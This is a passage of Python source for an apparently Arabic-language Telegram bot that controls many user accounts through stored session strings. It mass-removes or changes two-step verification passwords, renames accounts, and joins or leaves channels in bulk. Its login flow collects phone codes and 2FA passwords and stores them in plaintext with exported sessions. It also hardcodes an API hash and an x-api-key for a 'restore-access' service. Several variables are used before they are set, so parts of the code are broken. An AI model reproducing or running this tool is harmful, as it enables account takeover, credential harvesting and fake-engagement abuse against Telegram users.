		if g.text =="نعم":
			id = msg.chat.id
			j = 0
			await msg.reply("انتظر ....")
			
			for num in open(f'{id}n.txt',"r").read().split():
				client = Client(f"{num}.txt",api_id,api_hash,session_string=open(f"{num}.txt","r").read())
				try:
					await client.start()
				except Exception as ri:
					print(f"error in start : {ri}")
					pass
				else:
					try:
									
						try:
							ki = open(f"{num}-op.txt","r").read()
							print(ki)
						except:
							us= await client.get_me()
							ki = await msg.chat.ask(
				f"**ادخل تحقق الحساب : {us.mention}**")
							ki = ki.text
						try:
							await client.remove_cloud_password(ki)
						except:
							pass
						else:
							j+= 1
					
						try:
							os.remove(f"{num}-op.txt")
						except:
							pass
					except Exception as rui:
						print(f"error in _ : {rui}")
				
			await msg.reply(f"تم تغيير تحقق {j} حساب.",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		else:
			pass		
	if data == "fuk you":
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		if g.text =="نعم":
			id = msg.chat.id
			j = 0
			name = await msg.chat.ask("ادخل الاسم الجديد..")
			ko = 0
			await msg.reply("انتظر ....")
			for num in open(f'{id}n.txt',"r").read().split():
				
				async with Client(f"{num}t",api_id,api_hash,session_string=open(f"{num}.txt","r").read()) as client:
					try:
						await client.update_profile(first_name=name.text)
						ko += 1
					except Exception as rii:
						print(f"error in start : {rii}")
			await msg.reply(f"تم تغيير اسامي {ko} حساب، بنجاح.."
			,reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		else:
			pass

	if data == "viw":
		await client.invoke(peer=await client.resolve_peer(channel),id=msgd,increment=1)
	if data == "new all":
		id = msg.chat.id
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		if g.text =="نعم":
			j = 0
			await msg.reply("انتظر ....")
			kis = await msg.chat.ask(
				"**ادخل التحقق الجديد :!**")
			kis = kis.text
			for num in open(f'{id}n.txt',"r").read().split():
				client = Client(f"{num}.txt",api_id,api_hash,session_string=open(f"{num}.txt","r").read())
				try:
					await client.start()
				except Exception as ri:
					print(f"error in start : {ri}")
					pass
				else:
					try:
									
						try:
							ki = open(f"{num}-op.txt","r").read()
							print(ki)
						except:
							us= await client.get_me()
							ki = await msg.chat.ask(
				f"**ادخل تحقق الحساب : {us.mention}**")
							ki = ki.text
						try:
							await client.change_cloud_password(ki,kis)
						except:
							pass
						else:
							j+= 1
					
						try:
							os.remove(f"{num}-op.txt")
						except:
							pass
						open(f"{num}-op.txt","a").write(kis)
					except Exception as rui:
						print(f"error in _ : {rui}")
				
			await msg.reply(f"تم تغيير تحقق {j} حساب.",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		else:
			pass
	if data== "banss":
		id = msg.chat.id
		j = 0
		await msg.reply("انتظر ....")
		user = await msg.chat.ask("**ادخل يوزر القناة:**")
		
		text = user.text
		
		for num in open(f'{id}n.txt',"r").read().split():
			client = Client(f"{num}.txt",api_id,api_hash,session_string=open(f"{num}.txt","r").read())
			try:
				await client.start()
			except Exception as ri:
				print(f"error in start : {ri}")
				pass
			else:
				try:
					await client.leave_chat(text)
					j+= 1
				except Exception as rui:
					print(f"error in _ : {rui}")
			
		await msg.reply(
	f"تم المغادرة من القناة {text} من {j} حساب.",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		
	if data== "joins":
		id = msg.chat.id
		j = 0
		await msg.reply("انتظر ....")
		user = await msg.chat.ask("**ادخل يوزر القناة:**")
		
		text = user.text
		
		for num in open(f'{id}n.txt',"r").read().split():
			client = Client(f"{num}.txt",api_id,api_hash,session_string=open(f"{num}.txt","r").read())
			try:
				await client.start()
			except Exception as ri:
				print(f"error in start : {ri}")
				pass
			else:
				try:
					await client.join_chat(text)
					j+= 1
				except Exception as rui:
					print(f"error in _ : {rui}")
			
		await msg.reply(
	f"تم الدخول لـ{text} من {j} حساب.",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		
	
	if data =="sedeh":
		an = await call.edit_message_text('**انتظر..**'
)
		try:
			zemb = ""
			butt=[]
			zerop = 0
			for member in open(
			f'{msg.chat.id}n.txt',"r").read().split():
				
				
				try:
					oos = open(f"{member}-info.txt","r").read()
					gj = await bot.get_users(oos)
					zerop += 1
					butt.append([
						InlineKeyboardButton(
						f"﴾ @{gj.username}", callback_data=f"+ {member}"),
			 			InlineKeyboardButton(
			 	 			f"{gj.first_name} ", callback_data=f"+ {member}"),
			 	 		InlineKeyboardButton(
			 	 		
						f"﴿ الرقم {zerop}", callback_data=f"+ {member}"),])
				except:

					zerop += 1
					butt.append([
					InlineKeyboardButton(
					f"﴾ ", callback_data=f"kol"),
		 			InlineKeyboardButton(
		 	 			f"number- {zerop} ", callback_data=f"+ {member}"),
		 	 		InlineKeyboardButton(
		 	 		
					f" ﴿", callback_data=f"kol"),])
				
			
		
			
	
			butt.append([
				InlineKeyboardButton(
		 	 		
					f"رجوع - back", callback_data=f"main"),])
			await an.edit(f'''**اهلا بك مرة اخرى في قائمة التحكم،
			تمتلك {zerop} رقم للتحكم بهم انقر عليهم 
**''',reply_markup=InlineKeyboardMarkup(butt))
		except Exception as res:
			print(res)
			await an.edit(
"**حدثت مشكلة ما\n يبدو  انك لم تقم باضافة حساب مسبقاً** ",reply_markup=ikb(
		[[("رجوع . back","main")]]))
		
		
		
	if data =="sne":
		an = await call.edit_message_text('**انتظر..**'
)
		try:
			zemb = ""
			butt=[]
			zerop = 0
			for member in open(
			f'{msg.chat.id}n.txt',"r").read().split():
				zerop += 1
				
				
				
				try:
					oos = open(f"{member}-info.txt","r").read()
					gj = await bot.get_users(oos)
					zerop += 1
					butt.append([
						InlineKeyboardButton(
						f"﴾ @{gj.username}", callback_data=f"- {member}"),
			 			InlineKeyboardButton(
			 	 			f"{gj.first_name} ", callback_data=f"- {member}"),
			 	 		InlineKeyboardButton(
			 	 		
						f"﴿ الرقم {zerop}", callback_data=f"- {member}"),])
				except:

					zerop += 1
					butt.append([
					InlineKeyboardButton(
					f"﴾ ", callback_data=f"kol"),
		 			InlineKeyboardButton(
		 	 			f"number - {zerop} ", callback_data=f"- {member}"),
		 	 		InlineKeyboardButton(
		 	 		
					f" ﴿", callback_data=f"kol"),])
				
			butt.append([
				InlineKeyboardButton(
		 	 		
					f"رجوع - back", callback_data=f"main"),])
			await an.edit(f'''**
تم العثور على {zerop} رقم من قائمة الارقام التي سبق وقمت باضافاتها الى البوت 💙.
لمسح احد الارقام انقر عليه فقط 💚.**''',reply_markup=InlineKeyboardMarkup(butt))
		except:
			await an.edit(
"**لم تقم باضافه ارقام** ",reply_markup=ikb(
		[[("رجوع . back","main")]]))		
	if "-" in data:
		usu= ""
		usu += f"{data}"
		oj = usu.replace("- ","")
		m = await msg.reply("انتظرني...")
		
		try:
			os.remove(f"{oj}.txt")
			os.remove(f"{oj}-info.txt")
			os.remove(f"{oj}-op.txt")
			file_name = f"{msg.chat.id}n.txt"
			target_word = oj
			rem(file_name, target_word)
		except Exception as ux:
			print(ux)
			await m.edit("حدثت مشكلة.!!")
		else:
			pass
			await msg.reply(
		"**تم الحذف بنجاح**")
def rem(file_name, target_word):
 try:  
    with open(file_name, 'r') as file:
        lines = file.readlines()

    with open(file_name, 'w') as file:
        for line in lines:
            new_line = line.replace(target_word, '')
            file.write(new_line)
 except:
 	pass
async def pyrosram(msg,fkd):
	
	id = msg.chat.id

	if fkd == 1:
		  #  try:
			    ment = msg.from_user.mention
			    username = msg.chat.username
			    #,in_memory=True)
			    username = msg.chat.username
			    #await msg.reply("**تم استخراج جلسه بايرو") 
			    
			    account = await msg.chat.ask(f"**قم بأرسال رقم الحساب :**")
			    idu = random.choice("qwertyuiopasdghkzlxmcbnxcvn12345678910")
			    client = strpython(f"{id}_{idu}", api_id=12297551, api_hash="9d3fd6a2c52c6b01312e02a3abf9999b")
			    await client.connect()
			    number = ""
			    try:
			        send = await client.send_code(account.text)
			    except PhoneNumberInvalid:
			        await msg.reply(
						"**الرقم غلط **",reply_markup=ikb(
		[[("Back ","main")]]))
			    except pyrogram.errors.exceptions.bad_request_400.PhoneCodeInvalid:
			        await msg.reply("الكود خطا.")
			  
			    Code2 = send.phone_code_hash
			    code = await msg.chat.ask(f"**قم بارسال الكود الي وصلك : مثل 66666 ")
			    
			    for iu in code.text :
			    	number += f"{iu} "
			    
			    print(number)
			    try:
			         
			          await client.sign_in(account.text, Code2, number )
			    
			    except SessionPasswordNeeded:
			        code3 = await msg.chat.ask("**قم بارسال الباسورد.**")
			    try:
			        await client.check_password(code3.text)
			    except PasswordHashInvalid:
			        # = await code3.reply("رمز خطا، حاول مرة اخرى") 
			        pass
			    except (PhoneCodeInvalid, PhoneCodeExpired):
			        await code.reply("كود خطا. حاول مرة اخرى!",reply_markup=ikb(
		[[("رجوع . back","main")]]))
			  
			    
			    try:
			        
			        	await client.sign_in(account.text, number, Code2)
			    except:
			        pass
			    usn = account.text.replace("+","")
			    try:
			    	os.remove(f"{zezr}.txt")
			    	
			    except:
			    	pass
			    	
			    try:
			         os.remove(f"{usn}-op.txt")
			    except:
			        pass	
				    
			    
			    
			    na = await msg.reply("انتظر ...")
			    
			    session = await client.export_session_string()
			    
			    zezt = await client.get_me()
			    zezr = zezt.phone_number
			    
			    file_name = f"{id}n.txt"
			    target_word = zezr
			    rem(file_name, target_word)
				
				
			    
			    try:
			         os.remove(f"{zezr}.txt")
			         os.remove(f"{zezr}-info.txt")
			         os.remove(f"{usn}-op.txt")
			    except:
			        pass	
			    open(f"{usn}-op.txt","a").write(code3.text) 
			    open(f"{zezr}.txt","a").write(session)
			    open(f"{zezr}-info.txt","a").write(f"{zezt.username}")
			    open(f"{id}n.txt","a").write(f"{zezr}\n")
			    await na.delete()
			    await msg.reply("**- تم التسجيل...**",reply_markup=ikb([[
	("رجوع الى الصفحة الرئيسية","main")]]))
	
			    await client.disconnect() 
	if fkd == 2:
		aj = await msg.chat.ask("ادخل السيشن .")
		session = aj.text
		idu = random.choice("qwertyuiopasdghkzlxmcbnxcvn12345678910")
		client = Client(f"{id}_{session}_{idu}", api_id,api_hash,session_string=session)
		try:
			await client.start()
		except Exception as rd :
			print(rd)
			await msg.reply("السيشن محذوف ،",reply_markup=ikb([[
		    ("عودة للقائمة الرئيسية .","main")]]))
		else:
			zezt = await client.get_me()
			zezr = zezt.phone_number
			try:
				os.remove(f"{zezr}.txt")
				os.remove(f"{zezr}-info.txt")
				os.remove(f"{zezr}-op.txt")
			except:
			    	pass
			try:
				file_name = f"{id}n.txt"
				target_word = zezr
				rem(file_name, target_word)
			except:
			    	pass
			mp = await msg.chat.ask("ادخل تحقق الحساب :")
			
			open(f"{zezr}-op.txt","a").write(mp.text)
			open(f"{zezr}-info.txt","a").write(zezt.username)
			open(f"{zezr}.txt","a").write(session)
			open(f"{id}n.txt","a").write(f"{zezr}\n")
			await msg.reply(f"""
				تم تسجيل السيشن بنجاح
				اسم الحساب : {zezt.mention}
				رقم الهاتف : +{zezr}
				اليوزر : {zezt.username}
				""",reply_markup=ikb([[
		    ("عودة للقائمة الرئيسية .","main")]]))
		
		await asyncio.sleep(200)
		os.system('clear')
		
#		betza = await msg.chat.ask("ادخل السيشن .")
#		print(type(betza))  

#		if betza.text:
#			sesson = betza.text  # استخراج النص
#		
#			idu = random.choice("qwertyuiopasdghkzlxmcbnxcvn12345678910")
#			client = strpython(f"{id}_{betza}{idu}", api_id=12297551, api_hash="9d3fd6a2c52c6b01312e02a3abf9999b",session_string=sesson)
#			try:
#				await client.start()
#				zezt = await client.get_me()
#				zezr = zezt.phone_number
#				usn = zezr.text.replace("+","")
#				try:
#				         os.remove(f"{usn}.txt")
#				         os.remove(f"{usn}-info.txt")
#				         os.remove(f"{usn}-op.txt")
#				except:
#				        pass
#				file_name = f"{id}n.txt"
#				open(f"{usn}.txt","a").write(sesson)
#				open(f"{usn}-info.txt","a").write(f"{zezt.username}")
#				open(f"{id}n.txt","a").write(f"{zezr}\n")
#				
#			except Exception as k:
#				print(k)
#				
			    		    
@bot.on_callback_query()
async def answer(bot, call):
	data = call.data
	msg = call.message
	
	iid = msg.chat.id
	await cllas(data,msg,call)
			
@bot.on_message(str_pY.command("start"))
async def back (bot,msg):
	id = msg.chat.id
	try:
		await msg.edit("هلا كلبي اختار من الازرار",reply_markup=buttons)
	except:
		await msg.reply("مرحبا، بك عزيزي...",reply_markup=buttons)
	
	
name = "user.txt"
band = "ban.txt"
token = bot_token
admink = 5693914475

headers = {
    'Host': 'restore-access.indream.app',
    'Connection': 'keep-alive',
    'x-api-key': 'e758fb28-79be-4d1c-af6b-066633ded128',
    'Accept': '*/*',
    'Accept-Language': 'ar',
    'Content-Length': '25',
    'User-Agent': 'Nicegram/101 CFNetwork/1404.0.5 Darwin/22.3.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}
import uvloop,tgcrypto


bot.run()
uvloop.install()
# strpython.t.me